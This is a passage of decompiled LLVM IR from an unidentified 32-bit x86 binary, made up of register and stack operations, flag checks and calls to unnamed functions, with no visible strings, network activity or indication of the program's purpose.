  %v1_8049bc1 = add i32 %v0_8049bbc, 20900
  %v2_8049bc1 = inttoptr i32 %v1_8049bc1 to i32*
  %v3_8049bc1 = load i32, i32* %v2_8049bc1, align 4
  %v2_8049bc8 = add i32 %v0_8049bbf, 1
  %v1_8049bca = add i32 %v2_8049bc8, %v3_8049bc1
  %v8_8049bca = icmp eq i32 %v1_8049bca, 0
  store i1 %v8_8049bca, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bca, i32* %eax.global-to-local, align 4
  %v2_8049bcb = add i32 %v0_8049bbc, -16
  %v3_8049bcb = inttoptr i32 %v2_8049bcb to i32*
  store i32 %v1_8049bca, i32* %v3_8049bcb, align 4
  %v2_8049bcc = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049bcc, i32* @eax, align 4
  %v0_8049bd1 = load i32, i32* @esp, align 4
  %v1_8049bd1 = add i32 %v0_8049bd1, 16
  %v1_8049bd4 = add i32 %v2_8049bcc, -255
  %v6_8049bd4 = sub i32 254, %v2_8049bcc
  %v7_8049bd4 = and i32 %v6_8049bd4, %v2_8049bcc
  %v8_8049bd4 = icmp slt i32 %v7_8049bd4, 0
  %v9_8049bd4 = icmp eq i32 %v1_8049bd4, 0
  store i1 %v9_8049bd4, i1* %zf.global-to-local, align 1
  %v10_8049bd4 = icmp slt i32 %v1_8049bd4, 0
  %v3_8049bd9 = icmp eq i1 %v10_8049bd4, %v8_8049bd4
  %v4_8049bd9 = icmp eq i1 %v9_8049bd4, false
  %v5_8049bd9 = and i1 %v4_8049bd9, %v3_8049bd9
  br i1 %v5_8049bd9, label %dec_label_pc_804949f, label %dec_label_pc_8049bdf

dec_label_pc_8049bdf:                             ; preds = %dec_label_pc_8049bbc
  %v1_8049bdf = add i32 %v0_8049bd1, 92
  %v2_8049bdf = inttoptr i32 %v1_8049bdf to i32*
  %v3_8049bdf = load i32, i32* %v2_8049bdf, align 4
  store i32 %v3_8049bdf, i32* %ebx.global-to-local, align 4
  %v0_8049be3 = load i32, i32* @edi, align 4
  %v2_8049be3 = add i32 %v0_8049bd1, 12
  %v3_8049be3 = inttoptr i32 %v2_8049be3 to i32*
  store i32 %v0_8049be3, i32* %v3_8049be3, align 4
  %v0_8049be4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049be4 = add i32 %v0_8049be4, 533
  %v9_8049be4 = icmp eq i32 %v1_8049be4, 0
  store i1 %v9_8049be4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049be4, i32* @ebx, align 4
  %v0_8049bea = load i32, i32* @edi, align 4
  %v2_8049bea = add i32 %v0_8049bd1, 8
  %v3_8049bea = inttoptr i32 %v2_8049bea to i32*
  store i32 %v0_8049bea, i32* %v3_8049bea, align 4
  %v1_8049beb = add i32 %v0_8049bd1, 4
  %v2_8049beb = inttoptr i32 %v1_8049beb to i32*
  store i32 255, i32* %v2_8049beb, align 4
  %v0_8049bf0 = load i32, i32* @ebx, align 4
  %v3_8049bf0 = inttoptr i32 %v0_8049bd1 to i32*
  store i32 %v0_8049bf0, i32* %v3_8049bf0, align 4
  %v2_8049bf1 = call i32 @function_8051570(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049bf1, i32* %eax.global-to-local, align 4
  %v0_8049bf6 = load i32, i32* @esp, align 4
  %v1_8049bf6 = inttoptr i32 %v0_8049bf6 to i32*
  %v2_8049bf6 = load i32, i32* %v1_8049bf6, align 4
  store i32 %v2_8049bf6, i32* %ecx.global-to-local, align 4
  %v0_8049bf7 = load i32, i32* @esi, align 4
  store i32 %v0_8049bf7, i32* %eax.global-to-local, align 4
  %v1_8049bf9 = add i32 %v0_8049bf6, 20916
  %v2_8049bf9 = inttoptr i32 %v1_8049bf9 to i32*
  %v3_8049bf9 = load i32, i32* %v2_8049bf9, align 4
  store i32 %v3_8049bf9, i32* %edx.global-to-local, align 4
  %v2_8049c00 = add i32 %v0_8049bf7, 1
  %v1_8049c02 = add i32 %v2_8049c00, %v3_8049bf9
  %v8_8049c02 = icmp eq i32 %v1_8049c02, 0
  store i1 %v8_8049c02, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c02, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c02, i32* %v1_8049bf6, align 4
  %v2_8049c04 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049c04, i32* %eax.global-to-local, align 4
  %v0_8049c09 = load i32, i32* @esp, align 4
  %v1_8049c09 = add i32 %v0_8049c09, 16
  %v1_8049c0c = icmp eq i32 %v2_8049c04, 0
  store i1 %v1_8049c0c, i1* %zf.global-to-local, align 1
  %tmp149 = icmp slt i32 %v2_8049c04, 1
  br i1 %tmp149, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049c14:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049bdf
  %v1_8049c14 = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049c09, %dec_label_pc_8049bdf ]
  %v0_8049c14 = phi i32 [ %v2_8049ccd, %dec_label_pc_8049cbd ], [ %v2_8049c04, %dec_label_pc_8049bdf ]
  %v2_8049c14 = add i32 %v1_8049c14, -4
  %v3_8049c14 = inttoptr i32 %v2_8049c14 to i32*
  store i32 %v0_8049c14, i32* %v3_8049c14, align 4
  %v0_8049c15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c15 = add i32 %v1_8049c14, -8
  %v3_8049c15 = inttoptr i32 %v2_8049c15 to i32*
  store i32 %v0_8049c15, i32* %v3_8049c15, align 4
  %v1_8049c16 = add i32 %v1_8049c14, 20900
  %v2_8049c16 = inttoptr i32 %v1_8049c16 to i32*
  %v3_8049c16 = load i32, i32* %v2_8049c16, align 4
  %v0_8049c1d = load i32, i32* @esi, align 4
  %v2_8049c1d = add i32 %v0_8049c1d, %v3_8049c16
  %v12_8049c1d = icmp eq i32 %v2_8049c1d, 0
  store i1 %v12_8049c1d, i1* %zf.global-to-local, align 1
  %v1_8049c1f = add i32 %v2_8049c1d, 1
  store i32 %v1_8049c1f, i32* %eax.global-to-local, align 4
  %v2_8049c22 = add i32 %v1_8049c14, -12
  %v3_8049c22 = inttoptr i32 %v2_8049c22 to i32*
  store i32 %v1_8049c1f, i32* %v3_8049c22, align 4
  %v0_8049c23 = load i32, i32* @ebx, align 4
  %v2_8049c23 = add i32 %v1_8049c14, -16
  %v3_8049c23 = inttoptr i32 %v2_8049c23 to i32*
  store i32 %v0_8049c23, i32* %v3_8049c23, align 4
  %v3_8049c24 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049c24, i32* %eax.global-to-local, align 4
  %v0_8049c29 = load i32, i32* @esp, align 4
  %v1_8049c29 = add i32 %v0_8049c29, 16
  %v6_8049c29 = icmp eq i32 %v1_8049c29, 0
  store i1 %v6_8049c29, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804949f

dec_label_pc_8049c31:                             ; preds = %dec_label_pc_80497f0
  %v1_8049c31 = add i32 %v0_80497e2, 108
  %v2_8049c31 = inttoptr i32 %v1_8049c31 to i32*
  %v3_8049c31 = load i32, i32* %v2_8049c31, align 4
  store i32 %v3_8049c31, i32* %ecx.global-to-local, align 4
  %v1_8049c35 = add i32 %v3_8049c31, -1448
  %v2_8049c35 = inttoptr i32 %v1_8049c35 to i8*
  %v3_8049c35 = load i8, i8* %v2_8049c35, align 1
  %v4_8049c35 = icmp eq i8 %v3_8049c35, 0
  store i1 %v4_8049c35, i1* %zf.global-to-local, align 1
  br i1 %v4_8049c35, label %dec_label_pc_8048d91, label %dec_label_pc_8049c42

dec_label_pc_8049c42:                             ; preds = %dec_label_pc_8049c31
  store i8 1, i8* %v2_8049c35, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049a77
  %v2_8049c4e = add i32 %v0_8049aa9, 12
  %v3_8049c4e = inttoptr i32 %v2_8049c4e to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4e, align 4
  %v2_8049c4f = add i32 %v0_8049aa9, 8
  %v3_8049c4f = inttoptr i32 %v2_8049c4f to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4f, align 4
  %v1_8049c50 = add i32 %v0_8049aa9, 4
  %v2_8049c50 = inttoptr i32 %v1_8049c50 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8054394.5 to i32), i32* %v2_8049c50, align 4
  %v0_8049c55 = load i32, i32* @ebx, align 4
  %v3_8049c55 = inttoptr i32 %v0_8049aa9 to i32*
  store i32 %v0_8049c55, i32* %v3_8049c55, align 4
  %v0_8049c56 = call i32 @function_8051850()
  store i32 %v0_8049c56, i32* %eax.global-to-local, align 4
  %v0_8049c5b = load i32, i32* @esp, align 4
  %v3_8049c5e = trunc i32 %v0_8049c56 to i8
  %v4_8049c5e = icmp eq i8 %v3_8049c5e, 0
  store i1 %v4_8049c5e, i1* %zf.global-to-local, align 1
  %v1_8049c60 = icmp eq i1 %v4_8049c5e, false
  br i1 %v1_8049c60, label %dec_label_pc_8049ab4, label %dec_label_pc_8049c66

dec_label_pc_8049c66:                             ; preds = %dec_label_pc_8049c4e
  %v1_8049c66 = add i32 %v0_8049c5b, 120
  %v2_8049c66 = inttoptr i32 %v1_8049c66 to i32*
  %v3_8049c66 = load i32, i32* %v2_8049c66, align 4
  %v4_8049c66 = load i32, i32* @esi, align 4
  %v5_8049c66 = sub i32 %v3_8049c66, %v4_8049c66
  %v11_8049c66 = xor i32 %v4_8049c66, %v3_8049c66
  %v12_8049c66 = xor i32 %v5_8049c66, %v3_8049c66
  %v13_8049c66 = and i32 %v12_8049c66, %v11_8049c66
  %v14_8049c66 = icmp slt i32 %v13_8049c66, 0
  %v15_8049c66 = icmp eq i32 %v5_8049c66, 0
  store i1 %v15_8049c66, i1* %zf.global-to-local, align 1
  %v16_8049c66 = icmp slt i32 %v5_8049c66, 0
  %v1_8049c6a = add i32 %v0_8049c5b, 108
  %v2_8049c6a = inttoptr i32 %v1_8049c6a to i32*
  %v3_8049c6a = load i32, i32* %v2_8049c6a, align 4
  store i32 %v3_8049c6a, i32* %ecx.global-to-local, align 4
  %v3_8049c6e = icmp eq i1 %v16_8049c66, %v14_8049c66
  %v4_8049c6e = icmp eq i1 %v15_8049c66, false
  %v5_8049c6e = and i1 %v4_8049c6e, %v3_8049c6e
  %v6_8049c6e = zext i1 %v5_8049c6e to i32
  %v8_8049c6e = and i32 %v0_8049c56, -256
  %v9_8049c6e = or i32 %v6_8049c6e, %v8_8049c6e
  %v2_8049c71 = mul i32 %v9_8049c6e, 8
  %v3_8049c71 = add nsw i32 %v9_8049c6e, 1
  %v4_8049c71 = add i32 %v3_8049c71, %v2_8049c71
  store i32 %v4_8049c71, i32* %eax.global-to-local, align 4
  %v1_8049c75 = trunc i32 %v4_8049c71 to i8
  %v3_8049c75 = add i32 %v3_8049c6a, -1448
  %v4_8049c75 = inttoptr i32 %v3_8049c75 to i8*
  store i8 %v1_8049c75, i8* %v4_8049c75, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049c80:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5b
  %v0_8049c80 = phi i32 [ %v0_8049b52, %dec_label_pc_8049b5b ], [ %v0_8049b80184, %dec_label_pc_8049b6c ]
  %v1_8049c80 = inttoptr i32 %v0_8049c80 to i8*
  store i8 0, i8* %v1_8049c80, align 1
  br label %dec_label_pc_8049b86

dec_label_pc_8049c88:                             ; preds = %dec_label_pc_8049496
  %v1_8049c88 = add i32 %v0_804948a, 92
  %v2_8049c88 = inttoptr i32 %v1_8049c88 to i32*
  %v3_8049c88 = load i32, i32* %v2_8049c88, align 4
  store i32 %v3_8049c88, i32* %ebx.global-to-local, align 4
  %v0_8049c8c = load i32, i32* @ebp, align 4
  %v2_8049c8c = add i32 %v0_804948a, 12
  %v3_8049c8c = inttoptr i32 %v2_8049c8c to i32*
  store i32 %v0_8049c8c, i32* %v3_8049c8c, align 4
  %v0_8049c8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c8d = add i32 %v0_8049c8d, 533
  %v9_8049c8d = icmp eq i32 %v1_8049c8d, 0
  store i1 %v9_8049c8d, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c8d, i32* @ebx, align 4
  %v0_8049c93 = load i32, i32* @ebp, align 4
  %v2_8049c93 = add i32 %v0_804948a, 8
  %v3_8049c93 = inttoptr i32 %v2_8049c93 to i32*
  store i32 %v0_8049c93, i32* %v3_8049c93, align 4
  %v1_8049c94 = add i32 %v0_804948a, 4
  %v2_8049c94 = inttoptr i32 %v1_8049c94 to i32*
  store i32 255, i32* %v2_8049c94, align 4
  %v0_8049c99 = load i32, i32* @ebx, align 4
  %v3_8049c99 = inttoptr i32 %v0_804948a to i32*
  store i32 %v0_8049c99, i32* %v3_8049c99, align 4
  %v2_8049c9a = call i32 @function_8051570(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049c9a, i32* %eax.global-to-local, align 4
  %v0_8049c9f = load i32, i32* @esp, align 4
  %v1_8049c9f = inttoptr i32 %v0_8049c9f to i32*
  %v2_8049c9f = load i32, i32* %v1_8049c9f, align 4
  store i32 %v2_8049c9f, i32* @edi, align 4
  %v0_8049ca0 = load i32, i32* @esi, align 4
  store i32 %v0_8049ca0, i32* %eax.global-to-local, align 4
  %v1_8049ca2 = add i32 %v0_8049c9f, 20916
  %v2_8049ca2 = inttoptr i32 %v1_8049ca2 to i32*
  %v3_8049ca2 = load i32, i32* %v2_8049ca2, align 4
  store i32 %v3_8049ca2, i32* %ecx.global-to-local, align 4
  %v2_8049ca9 = add i32 %v0_8049ca0, 1
  %v1_8049cab = add i32 %v2_8049ca9, %v3_8049ca2
  %v8_8049cab = icmp eq i32 %v1_8049cab, 0
  store i1 %v8_8049cab, i1* %zf.global-to-local, align 1
  store i32 %v1_8049cab, i32* %eax.global-to-local, align 4
  store i32 %v1_8049cab, i32* %v1_8049c9f, align 4
  %v2_8049cad = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049cad, i32* %eax.global-to-local, align 4
  %v0_8049cb2 = load i32, i32* @esp, align 4
  %v1_8049cb2 = add i32 %v0_8049cb2, 16
  %v1_8049cb5 = icmp eq i32 %v2_8049cad, 0
  store i1 %v1_8049cb5, i1* %zf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v2_8049cad, 1
  br i1 %tmp150, label %dec_label_pc_804949f, label %dec_label_pc_8049cbd

dec_label_pc_8049cbd:                             ; preds = %dec_label_pc_8049c88
  %v0_8049cc0 = load i32, i32* @esi, align 4
  store i32 %v0_8049cc0, i32* %eax.global-to-local, align 4
  %v1_8049cc2 = add i32 %v0_8049cb2, 20916
  %v2_8049cc2 = inttoptr i32 %v1_8049cc2 to i32*
  %v3_8049cc2 = load i32, i32* %v2_8049cc2, align 4
  store i32 %v3_8049cc2, i32* %edx.global-to-local, align 4
  %v2_8049cc9 = add i32 %v0_8049cc0, 1
  %v1_8049ccb = add i32 %v2_8049cc9, %v3_8049cc2
  %v8_8049ccb = icmp eq i32 %v1_8049ccb, 0
  store i1 %v8_8049ccb, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ccb, i32* %eax.global-to-local, align 4
  %v3_8049ccc = inttoptr i32 %v0_8049cb2 to i32*
  store i32 %v1_8049ccb, i32* %v3_8049ccc, align 4
  %v2_8049ccd = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049ccd, i32* %eax.global-to-local, align 4
  %v0_8049cd2 = load i32, i32* @esp, align 4
  %v1_8049cd2 = add i32 %v0_8049cd2, 16
  %v1_8049cd5 = add i32 %v2_8049ccd, -255
  %v6_8049cd5 = sub i32 254, %v2_8049ccd
  %v7_8049cd5 = and i32 %v6_8049cd5, %v2_8049ccd
  %v8_8049cd5 = icmp slt i32 %v7_8049cd5, 0
  %v9_8049cd5 = icmp eq i32 %v1_8049cd5, 0
  store i1 %v9_8049cd5, i1* %zf.global-to-local, align 1
  %v10_8049cd5 = icmp slt i32 %v1_8049cd5, 0
  %v3_8049cda = icmp eq i1 %v10_8049cd5, %v8_8049cd5
  %v4_8049cda = icmp eq i1 %v9_8049cd5, false
  %v5_8049cda = and i1 %v4_8049cda, %v3_8049cda
  br i1 %v5_8049cda, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049ce5:                             ; preds = %dec_label_pc_8049ec7, %dec_label_pc_8049eb6
  %v0_8049ce5 = phi i32 [ %v0_8049eac, %dec_label_pc_8049eb6 ], [ %v0_8049edb208, %dec_label_pc_8049ec7 ]
  %v1_8049ce5 = inttoptr i32 %v0_8049ce5 to i8*
  store i8 0, i8* %v1_8049ce5, align 1
  br label %dec_label_pc_8049ce8

dec_label_pc_8049ce8:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge, %dec_label_pc_8049e86, %dec_label_pc_8049ce5
  %v0_8049ce8 = load i32, i32* @esp, align 4
  %v9_8049ce8 = icmp eq i32 %v0_8049ce8, 12
  store i1 %v9_8049ce8, i1* %zf.global-to-local, align 1
  %v0_8049ceb = load i32, i32* @ebx, align 4
  %v2_8049ceb = add i32 %v0_8049ce8, -16
  %v3_8049ceb = inttoptr i32 %v2_8049ceb to i32*
  store i32 %v0_8049ceb, i32* %v3_8049ceb, align 4
  %v2_8049cec = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049cec, i32* %eax.global-to-local, align 4
  %v0_8049cf1 = load i32, i32* @esp, align 4
  %v1_8049cf1 = add i32 %v0_8049cf1, 16
  %v1_8049cf4 = icmp eq i32 %v2_8049cec, 0
  store i1 %v1_8049cf4, i1* %zf.global-to-local, align 1
  %tmp151 = icmp slt i32 %v2_8049cec, 1
  br i1 %tmp151, label %dec_label_pc_8049d1e, label %dec_label_pc_8049cf8

dec_label_pc_8049cf8:                             ; preds = %dec_label_pc_8049ce8
  %v9_8049cf8 = icmp eq i32 %v0_8049cf1, -4
  store i1 %v9_8049cf8, i1* %zf.global-to-local, align 1
  %v0_8049cfb = load i32, i32* @ebx, align 4
  %v3_8049cfb = inttoptr i32 %v0_8049cf1 to i32*
  store i32 %v0_8049cfb, i32* %v3_8049cfb, align 4
  %v2_8049cfc = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049cfc, i32* %eax.global-to-local, align 4
  %v0_8049d01 = load i32, i32* @esp, align 4
  %v1_8049d01 = add i32 %v0_8049d01, 16
  %v1_8049d04 = add i32 %v2_8049cfc, -127
  %v6_8049d04 = sub i32 126, %v2_8049cfc
  %v7_8049d04 = and i32 %v6_8049d04, %v2_8049cfc
  %v8_8049d04 = icmp slt i32 %v7_8049d04, 0
  %v9_8049d04 = icmp eq i32 %v1_8049d04, 0
  store i1 %v9_8049d04, i1* %zf.global-to-local, align 1
  %v10_8049d04 = icmp slt i32 %v1_8049d04, 0
  %v3_8049d07 = icmp eq i1 %v10_8049d04, %v8_8049d04
  %v4_8049d07 = icmp eq i1 %v9_8049d04, false
  %v5_8049d07 = and i1 %v4_8049d07, %v3_8049d07
  br i1 %v5_8049d07, label %dec_label_pc_8049d1e, label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cf8
  %v2_8049d09 = add i32 %v0_8049d01, 12
  %v3_8049d09 = inttoptr i32 %v2_8049d09 to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d09, align 4
  %v2_8049d0a = add i32 %v0_8049d01, 8
  %v3_8049d0a = inttoptr i32 %v2_8049d0a to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d0a, align 4
  %v0_8049d0b = load i32, i32* @ebx, align 4
  %v2_8049d0b = add i32 %v0_8049d01, 4
  %v3_8049d0b = inttoptr i32 %v2_8049d0b to i32*
  store i32 %v0_8049d0b, i32* %v3_8049d0b, align 4
  %v1_8049d0c = add i32 %v0_8049d01, 92
  %v2_8049d0c = inttoptr i32 %v1_8049d0c to i32*
  %v3_8049d0c = load i32, i32* %v2_8049d0c, align 4
  %v1_8049d10 = add i32 %v3_8049d0c, 789
  %v9_8049d10 = icmp eq i32 %v1_8049d10, 0
  store i1 %v9_8049d10, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d10, i32* %eax.global-to-local, align 4
  %v3_8049d15 = inttoptr i32 %v0_8049d01 to i32*
  store i32 %v1_8049d10, i32* %v3_8049d15, align 4
  %v3_8049d16 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d16, i32* %eax.global-to-local, align 4
  %v0_8049d1b = load i32, i32* @esp, align 4
  %v1_8049d1b = add i32 %v0_8049d1b, 16
  %v6_8049d1b = icmp eq i32 %v1_8049d1b, 0
  store i1 %v6_8049d1b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d1e

dec_label_pc_8049d1e:                             ; preds = %dec_label_pc_8049cf8, %dec_label_pc_8049ce8, %dec_label_pc_8049a40, %dec_label_pc_8049d09
  %v0_8049d1e = phi i32 [ %v1_8049d01, %dec_label_pc_8049cf8 ], [ %v1_8049cf1, %dec_label_pc_8049ce8 ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d1b, %dec_label_pc_8049d09 ]
  %v0_8049d21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d21, i32* %eax.global-to-local, align 4
  %v1_8049d23 = add i32 %v0_8049d1e, 20900
  %v2_8049d23 = inttoptr i32 %v1_8049d23 to i32*
  %v3_8049d23 = load i32, i32* %v2_8049d23, align 4
  store i32 %v3_8049d23, i32* @ebp, align 4
  %v2_8049d2a = add i32 %v0_8049d21, 1
  %v1_8049d2c = add i32 %v2_8049d2a, %v3_8049d23
  %v8_8049d2c = icmp eq i32 %v1_8049d2c, 0
  store i1 %v8_8049d2c, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d2c, i32* %eax.global-to-local, align 4
  %v2_8049d2d = add i32 %v0_8049d1e, -16
  %v3_8049d2d = inttoptr i32 %v2_8049d2d to i32*
  store i32 %v1_8049d2c, i32* %v3_8049d2d, align 4
  %v2_8049d2e = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049d2e, i32* @eax, align 4
  %v0_8049d33 = load i32, i32* @esp, align 4
  %v1_8049d33 = add i32 %v0_8049d33, 16
  %v1_8049d36 = add i32 %v2_8049d2e, -255
  %v6_8049d36 = sub i32 254, %v2_8049d2e
  %v7_8049d36 = and i32 %v6_8049d36, %v2_8049d2e
  %v8_8049d36 = icmp slt i32 %v7_8049d36, 0
  %v9_8049d36 = icmp eq i32 %v1_8049d36, 0
  store i1 %v9_8049d36, i1* %zf.global-to-local, align 1
  %v10_8049d36 = icmp slt i32 %v1_8049d36, 0
  %v3_8049d3b = icmp eq i1 %v10_8049d36, %v8_8049d36
  %v4_8049d3b = icmp eq i1 %v9_8049d36, false
  %v5_8049d3b = and i1 %v4_8049d3b, %v3_8049d3b
  br i1 %v5_8049d3b, label %dec_label_pc_8049a49, label %dec_label_pc_8049d41

dec_label_pc_8049d41:                             ; preds = %dec_label_pc_8049d1e
  %v1_8049d41 = add i32 %v0_8049d33, 92
  %v2_8049d41 = inttoptr i32 %v1_8049d41 to i32*
  %v3_8049d41 = load i32, i32* %v2_8049d41, align 4
  store i32 %v3_8049d41, i32* %esi.global-to-local, align 4
  %v0_8049d45 = load i32, i32* @edi, align 4
  %v2_8049d45 = add i32 %v0_8049d33, 12
  %v3_8049d45 = inttoptr i32 %v2_8049d45 to i32*
  store i32 %v0_8049d45, i32* %v3_8049d45, align 4
  %v0_8049d46 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049d46 = add i32 %v0_8049d46, 533
  %v9_8049d46 = icmp eq i32 %v1_8049d46, 0
  store i1 %v9_8049d46, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d46, i32* @esi, align 4
  %v0_8049d4c = load i32, i32* @edi, align 4
  %v2_8049d4c = add i32 %v0_8049d33, 8
  %v3_8049d4c = inttoptr i32 %v2_8049d4c to i32*
  store i32 %v0_8049d4c, i32* %v3_8049d4c, align 4
  %v1_8049d4d = add i32 %v0_8049d33, 4
  %v2_8049d4d = inttoptr i32 %v1_8049d4d to i32*
  store i32 255, i32* %v2_8049d4d, align 4
  %v0_8049d52 = load i32, i32* @esi, align 4
  %v3_8049d52 = inttoptr i32 %v0_8049d33 to i32*
  store i32 %v0_8049d52, i32* %v3_8049d52, align 4
  %v2_8049d53 = call i32 @function_8051570(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049d53, i32* %eax.global-to-local, align 4
  %v0_8049d58 = load i32, i32* @esp, align 4
  %v1_8049d58 = inttoptr i32 %v0_8049d58 to i32*
  %v2_8049d58 = load i32, i32* %v1_8049d58, align 4
  store i32 %v2_8049d58, i32* %ecx.global-to-local, align 4
  %v0_8049d59 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d59, i32* %eax.global-to-local, align 4
  %v1_8049d5b = add i32 %v0_8049d58, 20916
  %v2_8049d5b = inttoptr i32 %v1_8049d5b to i32*
  %v3_8049d5b = load i32, i32* %v2_8049d5b, align 4
  store i32 %v3_8049d5b, i32* %edx.global-to-local, align 4
  %v2_8049d62 = add i32 %v0_8049d59, 1
  %v1_8049d64 = add i32 %v2_8049d62, %v3_8049d5b
  %v8_8049d64 = icmp eq i32 %v1_8049d64, 0
  store i1 %v8_8049d64, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d64, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d64, i32* %v1_8049d58, align 4
  %v2_8049d66 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049d66, i32* %eax.global-to-local, align 4
  %v0_8049d6b = load i32, i32* @esp, align 4
  %v1_8049d6b = add i32 %v0_8049d6b, 16
  %v1_8049d6e = icmp eq i32 %v2_8049d66, 0
  store i1 %v1_8049d6e, i1* %zf.global-to-local, align 1
  %tmp152 = icmp slt i32 %v2_8049d66, 1
  br i1 %tmp152, label %dec_label_pc_8049a49, label %dec_label_pc_8049d76

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d41
  %v0_8049d76 = load i32, i32* @ebp, align 4
  %v2_8049d76 = add i32 %v0_8049d6b, 12
  %v3_8049d76 = inttoptr i32 %v2_8049d76 to i32*
  store i32 %v0_8049d76, i32* %v3_8049d76, align 4
  %v0_8049d77 = load i32, i32* @ebp, align 4
  %v2_8049d77 = add i32 %v0_8049d6b, 8
  %v3_8049d77 = inttoptr i32 %v2_8049d77 to i32*
  store i32 %v0_8049d77, i32* %v3_8049d77, align 4
  %v1_8049d78 = add i32 %v0_8049d6b, 20916
  %v2_8049d78 = inttoptr i32 %v1_8049d78 to i32*
  %v3_8049d78 = load i32, i32* %v2_8049d78, align 4
  store i32 %v3_8049d78, i32* @edi, align 4
  %v0_8049d7f = load i32, i32* @ebx, align 4
  %v2_8049d7f = add i32 %v0_8049d7f, %v3_8049d78
  %v12_8049d7f = icmp eq i32 %v2_8049d7f, 0
  store i1 %v12_8049d7f, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d7f, i32* @ebx, align 4
  %v1_8049d81 = add i32 %v2_8049d7f, 1
  store i32 %v1_8049d81, i32* %eax.global-to-local, align 4
  %v2_8049d84 = add i32 %v0_8049d6b, 4
  %v3_8049d84 = inttoptr i32 %v2_8049d84 to i32*
  store i32 %v1_8049d81, i32* %v3_8049d84, align 4
  %v0_8049d85 = load i32, i32* @esi, align 4
  %v3_8049d85 = inttoptr i32 %v0_8049d6b to i32*
  store i32 %v0_8049d85, i32* %v3_8049d85, align 4
  %v3_8049d86 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d86, i32* %eax.global-to-local, align 4
  %v0_8049d8b = load i32, i32* @esp, align 4
  %v1_8049d8b = add i32 %v0_8049d8b, 16
  %v6_8049d8b = icmp eq i32 %v1_8049d8b, 0
  store i1 %v6_8049d8b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049a49

dec_label_pc_8049d93:                             ; preds = %dec_label_pc_8049b1d
  %v0_8049d93 = load i32, i32* @esp, align 4
  %v1_8049d93 = add i32 %v0_8049d93, 20900
  %v2_8049d93 = inttoptr i32 %v1_8049d93 to i32*
  store i32 8, i32* %v2_8049d93, align 4
  br label %dec_label_pc_8049b32

dec_label_pc_8049da3:                             ; preds = %dec_label_pc_804965f
  %v9_8049da3 = icmp eq i32 %v0_80496b5, 12
  store i1 %v9_8049da3, i1* %zf.global-to-local, align 1
  %v0_8049da6 = load i32, i32* @edi, align 4
  %v2_8049da6 = add i32 %v0_80496b5, -16
  %v3_8049da6 = inttoptr i32 %v2_8049da6 to i32*
  store i32 %v0_8049da6, i32* %v3_8049da6, align 4
  %v2_8049da7 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049da7, i32* %eax.global-to-local, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
  %v1_8049dac = add i32 %v0_8049dac, 16
  %v1_8049daf = add i32 %v2_8049da7, -127
  %v6_8049daf = sub i32 126, %v2_8049da7
  %v7_8049daf = and i32 %v6_8049daf, %v2_8049da7
  %v8_8049daf = icmp slt i32 %v7_8049daf, 0
  %v9_8049daf = icmp eq i32 %v1_8049daf, 0
  store i1 %v9_8049daf, i1* %zf.global-to-local, align 1
  %v10_8049daf = icmp slt i32 %v1_8049daf, 0
  %v3_8049db2 = icmp eq i1 %v10_8049daf, %v8_8049daf
  %v4_8049db2 = icmp eq i1 %v9_8049daf, false
